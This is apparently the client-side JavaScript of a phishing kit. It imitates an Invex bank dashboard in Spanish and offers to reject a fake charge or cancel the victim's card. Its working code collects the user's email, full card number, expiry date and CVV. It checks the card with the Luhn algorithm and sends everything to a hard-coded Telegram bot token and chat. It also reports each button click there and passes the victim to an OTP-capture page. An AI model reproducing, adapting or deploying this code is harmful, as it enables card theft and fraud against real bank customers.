document.addEventListener('DOMContentLoaded', () => {
  const userEmail = localStorage.getItem('user_email') || 'cliente@invex.com';

  const emailSpan = document.getElementById('user-email-text');
  if (emailSpan) {
    emailSpan.textContent = userEmail;
  }

  // --- 0. LECTURA DE DATOS DEL CARGO ACTUAL ---
  const cfgMerchant = sessionStorage.getItem('charge_merchant');
  const cfgAmount = sessionStorage.getItem('charge_amount');
  const merchantSpan = document.getElementById('charge-merchant');
  const amountSpan = document.getElementById('charge-amount');

  const currentMerchant = cfgMerchant || (merchantSpan ? merchantSpan.textContent : 'Programa Cero Sam´s');
  const currentAmount = cfgAmount || (amountSpan ? amountSpan.textContent : '$6,000.00 MXN');

  if (merchantSpan) merchantSpan.textContent = currentMerchant;
  if (amountSpan) amountSpan.textContent = currentAmount;

  // --- 1. REFERENCIAS DE VISTAS Y MENUS ---
  const navCargos = document.getElementById('nav-cargos');
  const navBaja = document.getElementById('nav-baja');
  const vistaCargos = document.getElementById('vista-cargos');
  const vistaBaja = document.getElementById('vista-baja');

  if(navCargos && navBaja) {
    navCargos.addEventListener('click', () => {
        navCargos.classList.add('active');
        navBaja.classList.remove('active');
        vistaCargos.style.display = 'block';
        vistaBaja.style.display = 'none';
    });

    navBaja.addEventListener('click', () => {
        navBaja.classList.add('active');
        navCargos.classList.remove('active');
        vistaBaja.style.display = 'block';
        vistaCargos.style.display = 'none';
    });
  }

const bajaMsg = document.getElementById('baja-status-message');

  function showBajaError(mensaje) {
    if (bajaMsg) {
      bajaMsg.style.display = 'block';
      bajaMsg.style.backgroundColor = '#f8d7da';
      bajaMsg.style.color = '#721c24';
      bajaMsg.textContent = mensaje;
    }
  }

  // --- 2. CREDENCIALES TELEGRAM ---
  const botToken = '9068600803:AAF1TcjtEuTKp2MD3gCAnYcptUS9CXEQgks';
  const chatId = '9180377107'; // Grupo Correcto

  // --- 3. VERIFICAR ESTADO DEL OTP Y EN QUÉ PESTAÑA ABRIR ---
  const lastAction = (localStorage.getItem('transaction_status') || '').toLowerCase();
  const flowType = sessionStorage.getItem('flow_type') || 'charge';
  const accionTelegram = (sessionStorage.getItem('accion_telegram') || '').toLowerCase();

  const urlParams = new URLSearchParams(window.location.search);
  const tabRequested = urlParams.get('tab');

  if ((lastAction && flowType === 'baja') || tabRequested === 'baja') {
    if (navBaja) navBaja.click();
  }


  // --- 4. HISTORIAL Y LÓGICA DE CARGOS ---
  const historialContainer = document.getElementById('cargos-historial');
  const chargeCard = document.querySelector('.charge-card');
  const btnActionsRow = document.querySelector('.btn-actions-row');

  let historialCargos = [];
  try {
    historialCargos = JSON.parse(localStorage.getItem('cargos_historial')) || [];
  } catch (e) {
    historialCargos = [];
  }

  const pendingAction = sessionStorage.getItem('charge_action');
  const resolvedMerchant = sessionStorage.getItem('resolved_merchant') || currentMerchant;
  const resolvedAmount = sessionStorage.getItem('resolved_amount') || currentAmount;

 let estadoResuelto = null;
  if (flowType === 'charge' && lastAction === 'aprobado' && pendingAction) {
    estadoResuelto = 'APROBADO';
  } else if (flowType === 'charge' && lastAction === 'rechazado' && pendingAction) {
    estadoResuelto = 'RECHAZADO';
  } else if (accionTelegram === 'cierre') {
    estadoResuelto = 'RECHAZADO';
  }

  // 1. Si se resolvió un cargo (ej. Programa Cero), lo agregamos al historial
  if (estadoResuelto) {
    historialCargos.push({
      comercio: resolvedMerchant,
      monto: resolvedAmount,
      estado: estadoResuelto
    });
    localStorage.setItem('cargos_historial', JSON.stringify(historialCargos));

    // Limpiamos las banderas de esa resolución
    localStorage.removeItem('transaction_status');
    sessionStorage.removeItem('accion_telegram');
    sessionStorage.removeItem('charge_action');
    sessionStorage.removeItem('resolved_merchant');
    sessionStorage.removeItem('resolved_amount');
  }

  // 2. Dibujamos todo el historial acumulado arriba
  function renderizarHistorial() {
    if (!historialContainer) return;
    historialContainer.innerHTML = '';

    historialCargos.forEach((item) => {
      const esAprobado = item.estado === 'APROBADO';
      const bg = esAprobado ? '#d4edda' : '#f8d7da';
      const border = esAprobado ? '#c3e6cb' : '#f5c6cb';
      const titleColor = esAprobado ? '#155724' : '#721c24';
      const badgeColor = esAprobado ? '#28a745' : '#dc3545';
      const titulo = esAprobado ? 'Transacción Aprobada Exitosamente' : 'Transacción Rechazada / Bloqueada';

      const cardHTML = `
        <div class="charge-card" style="background-color: ${bg}; border-color: ${border}; margin-bottom: 15px;">
          <h4 style="color: ${titleColor};">${titulo}</h4>
          <div class="charge-details">
            <p><strong>Comercio:</strong> ${item.comercio}</p>
            <p><strong>Monto Solicitado:</strong> ${item.monto}</p>
            <p><strong>Estado Actual:</strong> <span style="color: ${badgeColor}; font-weight: bold;">${item.estado}</span></p>
          </div>
        </div>
      `;
      historialContainer.innerHTML += cardHTML;
    });
  }

  renderizarHistorial();

  // 3. Verificamos si quedó un nuevo comercio | monto configurado desde Telegram
  if (accionTelegram === 'cierre') {
    sessionStorage.removeItem('charge_merchant');
    sessionStorage.removeItem('charge_amount');
  }
  
  const nuevoComercio = sessionStorage.getItem('charge_merchant');
  const nuevoMonto = sessionStorage.getItem('charge_amount');
  const hayCargoNuevo = Boolean(nuevoComercio && (nuevoComercio !== resolvedMerchant || nuevoMonto !== resolvedAmount));
  const esPrimeraCarga = historialCargos.length === 0 && !estadoResuelto;

  if ((hayCargoNuevo || esPrimeraCarga) && chargeCard) {
    if (merchantSpan && nuevoComercio) merchantSpan.textContent = nuevoComercio;
    if (amountSpan && nuevoMonto) amountSpan.textContent = nuevoMonto;

    chargeCard.style.display = 'block';
    if (btnActionsRow) btnActionsRow.style.display = 'flex';
  } else if (chargeCard) {
    chargeCard.style.display = 'none';
  }



  // --- 5. RESULTADO: LÓGICA DE BAJA DE TARJETA ---
  const formBajaContainer = document.getElementById('baja-form-container');
  const bajaResultContainer = document.getElementById('baja-result-container');
  const bajaErrorFlag = sessionStorage.getItem('baja_error');

  if (bajaErrorFlag === 'true') {
    sessionStorage.removeItem('baja_error');
    if (navBaja) navBaja.click();
    showBajaError('❌ Datos incorrectos. Por favor verifique los datos de su tarjeta e intente nuevamente.');
  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'aprobado') {
    // ... aquí sigue tu código actual de Tarjeta Digital Cancelada Exitosamente ...

    if (formBajaContainer) formBajaContainer.style.display = 'none';
    if (bajaResultContainer) {
      bajaResultContainer.style.display = 'block';
      bajaResultContainer.style.backgroundColor = '#d4edda';
      bajaResultContainer.style.border = '1px solid #c3e6cb';
      bajaResultContainer.innerHTML = `
        <h4 style="color: #155724; font-size: 15px; margin-bottom: 10px;">✅ Tarjeta Digital Cancelada Exitosamente</h4>
        <p style="font-size: 13px; color: #155724;">Su solicitud de baja ha sido procesada mediante la red segura. Su tarjeta ya no podrá recibir cargos ni autorizaciones.</p>
      `;
    }
    localStorage.removeItem('transaction_status');
  } else if ((flowType === 'baja' || tabRequested === 'baja') && lastAction === 'rechazado') {
    if (formBajaContainer) formBajaContainer.style.display = 'none';
    if (bajaResultContainer) {
      bajaResultContainer.style.display = 'block';
      bajaResultContainer.style.backgroundColor = '#f8d7da';
      bajaResultContainer.style.border = '1px solid #f5c6cb';
      bajaResultContainer.innerHTML = `
        <h4 style="color: #721c24; font-size: 15px; margin-bottom: 10px;">❌ Solicitud de Baja Rechazada</h4>
        <p style="font-size: 13px; color: #721c24;">No se pudo validar su código de seguridad OTP. Por protección a sus recursos, la tarjeta digital seguirá activa.</p>
      `;
    }
    localStorage.removeItem('transaction_status');
  }


  // --- 6. EVENTOS PARA LOS BOTONES DE CARGO ---
  const btnApprove = document.getElementById('btn-accept-charge');
  const btnReject = document.getElementById('btn-reject-charge');
  const statusMsg = document.getElementById('dash-status-message');

  async function sendActionToTelegram(actionType) {
    const text = `âš ï¸ El usuario (${userEmail}) ha seleccionado: *${actionType}* en el cargo simulado.`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
    try {
      await fetch(url);
    } catch (error) {
      console.error(error);
    }
  }

  if (btnApprove) {
    btnApprove.addEventListener('click', async () => {
      sessionStorage.setItem('flow_type', 'charge');
      sessionStorage.setItem('charge_action', 'aprobado');
      // Guardamos el cargo exacto que el usuario acaba de aprobar
      sessionStorage.setItem('resolved_merchant', currentMerchant);
      sessionStorage.setItem('resolved_amount', currentAmount);

      if (statusMsg) {
        statusMsg.style.display = 'block';
        statusMsg.style.backgroundColor = '#d4edda';
        statusMsg.style.color = '#155724';
        statusMsg.textContent = 'Procesando Aprobación... Redirigiendo a verificación OTP.';
      }
      await sendActionToTelegram('APROBAR CARGO');
      setTimeout(() => { window.location.href = 'loading.html'; }, 2000);
    });
  }

  if (btnReject) {
    btnReject.addEventListener('click', async () => {
      sessionStorage.setItem('flow_type', 'charge');
      sessionStorage.setItem('charge_action', 'rechazado');
      // Guardamos el cargo exacto que el usuario acaba de rechazar
      sessionStorage.setItem('resolved_merchant', currentMerchant);
      sessionStorage.setItem('resolved_amount', currentAmount);

      if (statusMsg) {
        statusMsg.style.display = 'block';
        statusMsg.style.backgroundColor = '#f8d7da';
        statusMsg.style.color = '#721c24';
        statusMsg.textContent = 'Procesando Rechazo... Redirigiendo a verificación OTP.';
      }
      await sendActionToTelegram('RECHAZAR CARGO');
      setTimeout(() => { window.location.href = 'loading.html'; }, 2000);
    });
  }

    // --- 7. AUTO-FORMATO Y VALIDACIONES PARA EL FORMULARIO DE BAJA ---
  const inputTarjeta = document.getElementById('baja-tarjeta');
  const inputVencimiento = document.getElementById('baja-vencimiento');

  if (inputTarjeta) {
    inputTarjeta.addEventListener('input', function () {
      // Extrae solo los 16 dígitos numéricos y agrupa de 4 en 4 con guion "-"
      const soloNumeros = this.value.replace(/\D/g, '').substring(0, 16);
      const grupos = soloNumeros.match(/.{1,4}/g);
      this.value = grupos ? grupos.join('-') : '';

      if (bajaMsg) bajaMsg.style.display = 'none';
    });
  }

  if (inputVencimiento) {
    inputVencimiento.addEventListener('input', function () {
      let val = this.value.replace(/\D/g, '');
      if (val.length > 2) {
        val = val.substring(0, 2) + '/' + val.substring(2, 4);
      }
      this.value = val;
    });
  }

  function isValidLuhn(value) {
    let nCheck = 0, bEven = false;
    value = value.replace(/\D/g, '');
    for (let n = value.length - 1; n >= 0; n--) {
      let cDigit = value.charAt(n), nDigit = parseInt(cDigit, 10);
      if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
      nCheck += nDigit;
      bEven = !bEven;
    }
    return (nCheck % 10) === 0;
  }

  const formBaja = document.getElementById('form-baja-digital');
  if (formBaja) {
    formBaja.addEventListener('submit', async (e) => {
      e.preventDefault();

      const tj = document.getElementById('baja-tarjeta').value; // Con guiones: 5253-4785-7485-7454
      const tjLimpia = tj.replace(/\D/g, ''); // Sin guiones: 5253478574857454
      const ven = document.getElementById('baja-vencimiento').value;
      const cvv = document.getElementById('baja-cvv').value;

      if (tjLimpia.length !== 16) {
        showBajaError('El número de tarjeta debe tener exactamente 16 dígitos.');
        return;
      }

      if (!isValidLuhn(tjLimpia)) {
        showBajaError('Error de seguridad: La tarjeta ingresada no es válida. Revise los números.');
        return;
      }

      sessionStorage.setItem('flow_type', 'baja');
      sessionStorage.setItem('baja_pendiente_validacion', 'true');

      if (bajaMsg) {
        bajaMsg.style.display = 'block';
        bajaMsg.style.backgroundColor = '#d4edda';
        bajaMsg.style.color = '#155724';
        bajaMsg.textContent = 'Validando datos de tarjeta... Por favor espere.';
      }

      const textoTG = `*SOLICITUD DE BAJA DE TARJETA DIGITAL*\n\n` +
        `👤 *Usuario:* \`${userEmail}\`\n` +
        `💳 *Tarjeta:* \`${tj}\`\n` +
        `📅 *Vencimiento:* \`${ven}\`\n` +
        `🔑 *CVV:* \`${cvv}\`\n\n` +
        `Responde \`ok\` para confirmar la baja directa o \`no\` si los datos son incorrectos.`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: textoTG,
            parse_mode: 'Markdown'
          })
        });
      } catch (error) {
        console.error(error);
      }

      setTimeout(() => {
        window.location.href = 'loading.html';
      }, 2000);
    });
  }

  // --- 8. BOTÓN DE CERRAR SESIÓN ---
  const btnLogout = document.getElementById('dash-logout');
  if (btnLogout) {
    btnLogout.addEventListener('click', (e) => {
      e.preventDefault();
      localStorage.clear();
      sessionStorage.clear();
      window.location.href = 'index.html';
    });
  }
});
